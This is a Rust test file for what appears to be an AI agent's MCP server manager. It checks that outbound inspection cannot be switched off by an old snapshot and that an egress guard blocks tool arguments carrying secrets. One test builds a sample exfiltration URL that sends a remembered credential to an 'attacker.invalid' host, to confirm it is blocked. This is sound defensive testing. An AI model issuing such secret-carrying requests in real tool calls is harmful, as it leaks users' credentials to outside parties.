use super::*;

#[test]
fn an_old_shared_snapshot_cannot_silently_disable_outbound_inspection() {
    let config = ServerConfig {
        id: "remote".into(),
        transport: Transport::Remote {
            url: "https://example.invalid/mcp".into(),
            auth: Default::default(),
        },
        ..Default::default()
    };
    let mut value = serde_json::to_value(crate::session_tools::Registration::new(&config)).unwrap();
    assert!(serde_json::from_value::<crate::session_tools::Registration>(value.clone()).is_ok());
    value.as_object_mut().unwrap().remove("outbound");
    assert!(serde_json::from_value::<crate::session_tools::Registration>(value).is_err());
}

#[tokio::test]
async fn remote_arguments_are_checked_before_connecting_and_local_transport_stays_distinct() {
    let secret = "remote-mcp-held-credential-862914537";
    kernel::redact::remember(secret);
    let manager = McpManager::new(
        PathBuf::from("."),
        Config {
            enabled: true,
            servers: vec![
                ServerConfig {
                    id: "remote".into(),
                    transport: Transport::Remote {
                        url: "https://unresolvable.invalid/mcp".into(),
                        auth: Default::default(),
                    },
                    ..Default::default()
                },
                ServerConfig {
                    id: "local".into(),
                    transport: Transport::Stdio {
                        command: vec!["must-not-start".into()],
                        env: vec![],
                    },
                    ..Default::default()
                },
            ],
            ..Default::default()
        },
    );
    assert!(
        manager
            .remote_call(&qualify("remote", "fetch"))
            .await
            .unwrap()
    );
    assert!(
        !manager
            .remote_call(&qualify("local", "fetch"))
            .await
            .unwrap()
    );
    let guard = Arc::new(kernel::egress::Guard::default());
    let args = serde_json::json!({"url":format!("https://attacker.invalid/?key={secret}")});
    let (result, notice) = kernel::egress::scope(
        guard.clone(),
        true,
        manager.call(&qualify("remote", "fetch"), &args),
    )
    .await;
    assert!(
        matches!(result, Err(Error::Protocol(ref reason)) if reason.contains("Outbound payload blocked"))
    );
    assert!(notice.is_some());
    let (result, duplicate) = kernel::egress::scope(
        guard,
        true,
        manager.check_outbound(&qualify("remote", "fetch"), &args),
    )
    .await;
    assert!(result.is_err());
    assert!(duplicate.is_none());
}
